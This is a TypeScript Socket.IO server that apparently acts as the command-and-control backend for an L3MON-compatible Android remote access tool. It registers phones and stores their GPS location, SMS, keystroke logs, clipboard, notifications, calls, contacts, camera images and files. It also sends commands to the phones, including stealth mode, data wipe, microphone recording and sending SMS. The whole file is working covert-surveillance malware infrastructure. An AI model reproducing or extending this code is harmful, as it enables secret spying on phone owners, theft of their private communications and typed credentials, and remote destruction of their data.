import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";
import { getDb } from "./db";
import { eq } from "drizzle-orm";
import { devices, locationHistory, smsLogs } from "../drizzle/schema";
import { eventBus } from "./eventBus";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

export class WebSocketManager {
  private io: SocketIOServer;
  private deviceConnections: Map<number, Set<string>> = new Map();
  private lastLocations: Map<number, DeviceLocation> = new Map();
  private lastSMS: Map<number, SMSMessage[]> = new Map();

  constructor(httpServer: HTTPServer) {
    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: process.env.FRONTEND_URL || "*",
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
      allowEIO3: true,
    });

    this.setupEventHandlers();
    this.setupEventBusListeners();
  }

  private setupEventBusListeners(): void {
    eventBus.on("execute-command", (data: any) => {
      console.log(`[WebSocket] EVENTBUS Bridge: Command for ${data.deviceId}:`, data.action);
      this.broadcastToDevice(data.deviceId, "execute-command", {
        action: data.action,
        details: data.details,
        userId: data.userId,
        payload: data.payload || data.details || {}
      });
    });
  }

  private setupEventHandlers(): void {
    this.io.on("connection", async (socket: Socket) => {
      const { model, manf, release, id: androidId } = socket.handshake.query;
      console.log(`[WebSocket] New socket trying to connect: ${socket.id} | Handshake params: model=${model}, androidId=${androidId}`);

      // 1. Device Registration / Identification
      let connectedDeviceId: number | null = null;
      if (androidId && model) {
        try {
          const db = await getDb();
          if (db) {
            const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, String(androidId))).limit(1);
            if (deviceRecords.length > 0) {
              connectedDeviceId = deviceRecords[0].id;
              await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
            } else {
              const result = await db.insert(devices).values({
                deviceId: String(androidId),
                deviceName: `${manf || 'Android'} ${model}`,
                manufacturer: String(manf || 'Unknown'),
                model: String(model),
                androidVersion: String(release || 'Unknown'),
                ownerId: 1,
                status: "online",
                lastSeen: new Date(),
              } as any);
              connectedDeviceId = (result as any)[0]?.insertId;
            }

            if (connectedDeviceId) {
              console.log(`[WebSocket] Device ${connectedDeviceId} identifying. Joining room: device:${connectedDeviceId}`);
              socket.join(`device:${connectedDeviceId}`);
              (socket as any).deviceId = connectedDeviceId;
              if (!this.deviceConnections.has(connectedDeviceId)) {
                this.deviceConnections.set(connectedDeviceId, new Set());
              }
              this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
              console.log(`[WebSocket] Device ${connectedDeviceId} (${model}) is now ONLINE.`);
              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
            } else {
              console.warn(`[WebSocket] Socket ${socket.id} connected but could not be mapped to a device. androidId=${androidId}`);
            }
          }
        } catch (e) {
          console.error("[WebSocket] Device registration failed:", e);
        }
      }

      // 2. User Handlers (Dashboard access)
      socket.on("join-device", (targetId: number) => {
        socket.join(`device:${targetId}`);
        if (!this.deviceConnections.has(targetId)) {
          this.deviceConnections.set(targetId, new Set());
        }
        this.deviceConnections.get(targetId)!.add(socket.id);
        console.log(`[WebSocket] User ${socket.id} joined device ${targetId}`);

        // Sync initial state
        const lastLoc = this.lastLocations.get(targetId);
        if (lastLoc) socket.emit("location-update", lastLoc);
        const lastSms = this.lastSMS.get(targetId);
        if (lastSms) socket.emit("sms-batch", lastSms);
      });

      socket.on("leave-device", (targetId: number) => {
        socket.leave(`device:${targetId}`);
        this.deviceConnections.get(targetId)?.delete(socket.id);
        console.log(`[WebSocket] User ${socket.id} left device ${targetId}`);
      });

      // 3. Device Data Handlers (Enhanced security with connectedDeviceId)
      socket.on("device-location", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
      });

      // Alias for legacy APKs
      socket.on("location", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
      });

      socket.on("device-sms", async (data: SMSMessage) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleSMSMessage({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
        }
      });

      // Alias for legacy APKs
      socket.on("sms", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const sms: SMSMessage = {
            deviceId: id,
            phoneNumber: data.phoneNumber || data.number || "Unknown",
            message: data.message || data.body || "",
            timestamp: data.timestamp || Date.now(),
            direction: data.direction || "incoming"
          };
          await this.handleSMSMessage(sms);
          this.io.to(`device:${id}`).emit("sms-received", sms);
        }
      });

      socket.on("device-status", (data: DeviceStatus) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          this.io.to(`device:${id}`).emit("status-update", { ...data, deviceId: id });
        }
      });

      socket.on("device-permissions", async (data: { deviceId: number, permissions: any }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handlePermissionUpdate({ deviceId: id, permissions: data.permissions });
          this.io.to(`device:${id}`).emit("permissions-update", data.permissions);
        }
      });

      socket.on("device-keylog", async (data: { deviceId: number, text: string, app: string, timestamp: number }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleKeylogUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("keylog-new", { ...data, deviceId: id });
        }
      });

      socket.on("device-notification", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { advancedMonitoring } = await import("./advancedMonitoring");
          await advancedMonitoring.logNotification({
            deviceId: id,
            appName: data.appName || "Unknown",
            title: data.title || "",
            content: data.content || data.body || "",
            timestamp: new Date(data.timestamp || Date.now()),
            isRead: false
          });
          this.io.to(`device:${id}`).emit("notification-new", { ...data, deviceId: id });
        }
      });

      socket.on("device-clipboard", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { advancedMonitoring } = await import("./advancedMonitoring");
          await advancedMonitoring.logClipboardEntry({
            deviceId: id,
            content: data.content || "",
            dataType: data.type || "text",
            timestamp: new Date(data.timestamp || Date.now()),
            contentPreview: (data.content || "").substring(0, 100)
          });
          this.io.to(`device:${id}`).emit("clipboard-new", { ...data, deviceId: id });
        }
      });

      // Alias for legacy APKs
      socket.on("clipboard", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { advancedMonitoring } = await import("./advancedMonitoring");
          const content = typeof data === 'string' ? data : (data.content || data.text || "");
          await advancedMonitoring.logClipboardEntry({
            deviceId: id,
            content: content,
            dataType: "text",
            timestamp: new Date(),
            contentPreview: content.substring(0, 100)
          });
          this.io.to(`device:${id}`).emit("clipboard-new", { content, deviceId: id, timestamp: Date.now() });
        }
      });

      // [PLATINUM PHASE 2] Route device responses to the internal EventBus for trpc
      socket.on("device-files", (data: { deviceId: number, path: string, contents: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { eventBus } = require("./eventBus");
          eventBus.emit(`files-response-${id}`, data);
        }
      });

      socket.on("device-apps", (data: { deviceId: number, apps: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { eventBus } = require("./eventBus");
          eventBus.emit(`apps-response-${id}`, data);
        }
      });

      // [PLATINUM PHASE 3] Calls handler (0xCL)
      socket.on("device-calls", (data: { deviceId: number, calls: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[WebSocket] Calls data from device ${id}: ${data.calls?.length} records`);
          const { eventBus } = require("./eventBus");
          eventBus.emit(`calls-response-${id}`, data);
          this.io.to(`device:${id}`).emit("calls-update", { ...data, deviceId: id });
        }
      });

      // Legacy alias for L3MON call events
      socket.on("calls", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const callsArray = Array.isArray(data) ? data : (data.calls || []);
          const { eventBus } = require("./eventBus");
          eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
          this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
        }
      });

      // [PLATINUM PHASE 3] Contacts handler (0xCO)
      socket.on("device-contacts", (data: { deviceId: number, contacts: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[WebSocket] Contacts data from device ${id}: ${data.contacts?.length} records`);
          const { eventBus } = require("./eventBus");
          eventBus.emit(`contacts-response-${id}`, data);
          this.io.to(`device:${id}`).emit("contacts-update", { ...data, deviceId: id });
        }
      });

      // Legacy alias for L3MON contact events
      socket.on("contacts", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const contactsArray = Array.isArray(data) ? data : (data.contacts || []);
          const { eventBus } = require("./eventBus");
          eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
          this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
        }
      });

      // [PLATINUM PHASE 3] Camera / Media file handler (0xCA)
      socket.on("device-camera", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[WebSocket] Camera data received from device ${id}`);
          try {
            // Save image to evidence folder and DB
            const fs = await import("fs/promises");
            const path = await import("path");
            const evidenceDir = path.join(process.cwd(), "builds", "evidence");
            await fs.mkdir(evidenceDir, { recursive: true });
            if (data.imageBase64) {
              const timestamp = Date.now();
              const fileName = `camera_${id}_${timestamp}.jpg`;
              const filePath = path.join(evidenceDir, fileName);
              await fs.writeFile(filePath, Buffer.from(data.imageBase64, "base64"));
              const db = await getDb();
              if (db) {
                const { mediaFiles } = await import("../drizzle/schema");
                await (db as any).insert(mediaFiles).values({
                  deviceId: id,
                  fileName,
                  fileType: "photo",
                  fileSize: Buffer.byteLength(data.imageBase64, "base64"),
                  fileUrl: `/evidence/${fileName}`,
                  timestamp: new Date(),
                });
              }
              this.io.to(`device:${id}`).emit("camera-new", { deviceId: id, fileName, url: `/evidence/${fileName}`, timestamp });
              console.log(`[WebSocket] Camera image saved: ${fileName}`);
            }
          } catch (e) {
            console.error("[WebSocket] Camera save failed:", e);
          }
        }
      });

      // Legacy alias for L3MON camera event
      socket.on("camera", async (data: any) => {
        const id = connectedDeviceId;
        if (id && (data.imageBase64 || data.image)) {
          const imgData = data.imageBase64 || data.image;
          socket.emit("device-camera", { deviceId: id, imageBase64: imgData });
        }
      });

      // [PLATINUM PHASE 3] File upload FROM device handler
      socket.on("device-file-upload", async (data: { deviceId: number, path: string, content: string }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          console.log(`[WebSocket] File upload from device ${id}: ${data.path}`);
          try {
            const fs = await import("fs/promises");
            const path = await import("path");
            const evidenceDir = path.join(process.cwd(), "builds", "evidence", "files");
            await fs.mkdir(evidenceDir, { recursive: true });
            const fileName = path.basename(data.path);
            await fs.writeFile(path.join(evidenceDir, fileName), Buffer.from(data.content, "base64"));
            const { eventBus } = require("./eventBus");
            eventBus.emit(`file-uploaded-${id}`, { deviceId: id, path: data.path, localPath: `/evidence/files/${fileName}` });
          } catch (e) {
            console.error("[WebSocket] File upload failed:", e);
          }
        }
      });

      // 4. Disconnect Handler
      socket.on("disconnect", async () => {
        if (connectedDeviceId) {
          try {
            const db = await getDb();
            if (db) {
              await db.update(devices).set({ status: "offline" }).where(eq(devices.id, connectedDeviceId));
              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "offline", timestamp: Date.now() });
              this.deviceConnections.get(connectedDeviceId)?.delete(socket.id);
            }
          } catch (e) {
            console.error("[WebSocket] Offline update failed:", e);
          }
        }
        console.log(`[WebSocket] Client disconnected: ${socket.id}`);
      });
    });
  }

  private async handleLocationUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      // Normailize coordinates (L3MON uses lat/lon)
      const lat = data.latitude ?? data.lat;
      const lon = data.longitude ?? data.lon ?? data.lng;
      
      if (lat === undefined || lon === undefined) return;

      const location = {
        deviceId: data.deviceId,
        latitude: parseFloat(String(lat)),
        longitude: parseFloat(String(lon)),
        accuracy: parseFloat(String(data.accuracy ?? data.acc ?? 0)),
        speed: parseFloat(String(data.speed ?? 0)),
        bearing: parseFloat(String(data.bearing ?? 0)),
        timestamp: data.timestamp ? new Date(data.timestamp) : new Date()
      };

      // Store in history
      await db.insert(locationHistory).values({
        deviceId: location.deviceId,
        latitude: location.latitude.toString(),
        longitude: location.longitude.toString(),
        accuracy: location.accuracy.toString(),
        speed: location.speed.toString(),
        bearing: location.bearing.toString(),
        timestamp: location.timestamp,
      });

      // Update last known location in memory for real-time hooks
      this.lastLocations.set(location.deviceId, location as any);

      // Persist to device metadata for quick retrieval in lists
      const deviceRecords = await db.select().from(devices).where(eq(devices.id, location.deviceId)).limit(1);
      if (deviceRecords.length > 0) {
        const currentMetadata = (deviceRecords[0].metadata as any) || {};
        await db.update(devices).set({
          metadata: {
            ...currentMetadata,
            lastLocation: {
              lat: location.latitude,
              lon: location.longitude,
              acc: location.accuracy,
              time: location.timestamp.toISOString()
            }
          }
        }).where(eq(devices.id, location.deviceId));
      }
    } catch (error) {
      console.error("[WebSocket] Error storing location:", error);
    }
  }

  private async handleBinaryData(socket: Socket, type: "audio" | "file", data: any): Promise<void> {
    try {
      const fs = require("fs");
      const path = require("path");
      const crypto = require("crypto");
      
      const evidenceDir = path.join(process.cwd(), "builds", "evidence");
      if (!fs.existsSync(evidenceDir)) fs.mkdirSync(evidenceDir, { recursive: true });

      const hash = crypto.createHash('md5').update(new Date().getTime() + Math.random().toString()).digest("hex");
      const fileName = type === "audio" 
        ? `audio_${Date.now()}_${hash.substr(0, 8)}.mp3`
        : `file_${hash.substr(0, 8)}_${data.name}`;
      
      const filePath = path.join(evidenceDir, fileName);
      fs.writeFileSync(filePath, data.buffer);
      
      console.log(`[WebSocket] Binary ${type} saved to: ${filePath}`);
      // [MOD L3MON] Persist to database
      const db = await getDb();
      if (db) {
        const { mediaFiles } = await import("../drizzle/schema");
        // Find device ID for this socket
        let deviceId = (socket as any).deviceId;
        if (!deviceId) {
           // Fallback: search in connections
           for (const [id, connections] of this.deviceConnections.entries()) {
             if (connections.has(socket.id)) {
               deviceId = id;
               break;
             }
           }
        }

        if (deviceId) {
          await db.insert(mediaFiles).values({
            deviceId,
            fileType: type === "audio" ? "audio" : "photo",
            fileName: fileName,
            fileUrl: `/api/evidence/download/${fileName}`,
            fileSize: data.buffer.length,
            timestamp: new Date()
          });
        }
      }

      // Notify panel about new file
      this.io.emit("evidence-new", {
         type,
         name: fileName,
         path: `/api/evidence/download/${fileName}`,
         timestamp: Date.now()
      });
    } catch (e) {
      console.error(`[WebSocket] Error saving binary ${type}:`, e);
    }
  }

  private async handleSMSMessage(sms: SMSMessage): Promise<void> {
    const db = await getDb();
    if (!db) {
      console.warn("[WebSocket] Database not available");
      return;
    }

    try {
      // Store SMS in database
      await db.insert(smsLogs).values({
        deviceId: sms.deviceId,
        phoneNumber: sms.phoneNumber,
        messageBody: sms.message,
        direction: sms.direction,
        timestamp: new Date(sms.timestamp),
      });

      // Keep last 50 SMS messages in memory
      if (!this.lastSMS.has(sms.deviceId)) {
        this.lastSMS.set(sms.deviceId, []);
      }
      const smsList = this.lastSMS.get(sms.deviceId)!;
      smsList.unshift(sms);
      if (smsList.length > 50) {
        smsList.pop();
      }
    } catch (error) {
      console.error("[WebSocket] Error storing SMS:", error);
    }
  }

  private async handlePermissionUpdate(data: { deviceId: number, permissions: any }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      // Get current metadata
      const deviceRecords = await db.select().from(devices).where(eq(devices.id, data.deviceId)).limit(1);
      if (deviceRecords.length === 0) return;

      const currentMetadata = (deviceRecords[0].metadata as any) || {};
      const updatedMetadata = {
        ...currentMetadata,
        androidPermissions: data.permissions,
        lastPermissionSync: new Date().toISOString()
      };

      await db.update(devices)
        .set({ metadata: updatedMetadata })
        .where(eq(devices.id, data.deviceId));
      
      console.log(`[WebSocket] Updated permissions for device ${data.deviceId}`);
    } catch (e) {
      console.error("[WebSocket] Permission persistence failed:", e);
    }
  }

  private async handleKeylogUpdate(data: { deviceId: number, text: string, app: string, timestamp: number }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
        // We could store keylogs in a separate table, but for now we'll put them in generic logs or metadata
        // Recommendation: Create an activity_logs entry
        const { activityLogs } = await import("../drizzle/schema");
        await db.insert(activityLogs).values({
            deviceId: data.deviceId,
            activityType: "keylog",
            description: `[${data.app}] ${data.text}`,
            metadata: { app: data.app, rawText: data.text },
            timestamp: new Date(data.timestamp)
        });
    } catch (e) {
        console.error("[WebSocket] Keylog persistence failed:", e);
    }
  }

  public broadcastToDevice(deviceId: number, event: string, data: any): void {
    // 1. Map modern action names to legacy protocol if needed
    const action = data.action || event;
    const mapping: Record<string, string> = {
      "request-files": "0xFI",
      "download-file": "0xFI",
      "delete-file": "UNSUPPORTED",
      "get_apps": "0xIN",
      "get_clipboard": "0xCB",
      "get_notifications": "0xNO",
      "get_wifi_scan": "0xWI",
      "get_keylogs": "UNSUPPORTED",
      "lock_device": "0xLK",
      "get-location": "0xLO",
      "screenshot": "0xSC",
      "vibrate": "0xVB",
      "reboot": "0xRB",
      "wipe_data": "0xWD",
      "start_audio_recording": "0xMI",
      "enable_stealth": "0xES",
      "disable_stealth": "0xDS",
      "set_gps_polling_speed": "0xLO",
      "get-wifi": "0xWI",
      "get-sms": "0xSM",
      "get-calls": "0xCL",
      "get-contacts": "0xCO",
      "get-camera": "0xCA",
      "send-sms": "0xSM",
      "upload-file": "0xFI"
    };

    const mappedAction = mapping[action] || action;
    
    // Si la acción no está soportada por el APK L3MON base, abortar el envío para no saturar
    if (mappedAction === "UNSUPPORTED") {
      console.warn(`[WebSocket] Acción '${action}' no está soportada por el APK base actual.`);
      return;
    }

    const payload = {
      action: mappedAction, // Legacy L3MON action name
      type: mappedAction,   // Some branches use type
      details: data.details || data.payload || {},
      payload: data.payload || data.details || {},
      deviceId: deviceId,
      timestamp: Date.now()
    };

    console.log(`[WebSocket] TRANSMIT to device:${deviceId} | Protocol: Multi-Event | Action: ${mappedAction}`);

    // Broadcast across ALL possible event listeners for maximum compatibility
    this.io.to(`device:${deviceId}`).emit("execute-command", payload);
    this.io.to(`device:${deviceId}`).emit("order", payload);
    this.io.to(`device:${deviceId}`).emit("command", payload);
    // Specifically handle the event name passed (like 'get-location') if different
    if (event !== "execute-command" && event !== "order" && event !== "command") {
       this.io.to(`device:${deviceId}`).emit(event, payload);
    }
  }

  public broadcastToAll(event: string, data: any): void {
    this.io.emit(event, data);
  }

  public getConnectedDevices(): number[] {
    return Array.from(this.deviceConnections.keys()).map(Number);
  }

  public getDeviceConnections(deviceId: number): number {
    return this.deviceConnections.get(deviceId)?.size || 0;
  }

  public getIO(): SocketIOServer {
    return this.io;
  }
}

let wsManager: WebSocketManager | null = null;

export function initializeWebSocket(httpServer: HTTPServer): WebSocketManager {
  if (!wsManager) {
    wsManager = new WebSocketManager(httpServer);
  }
  return wsManager;
}

export function getWebSocketManager(): WebSocketManager | null {
  return wsManager;
}
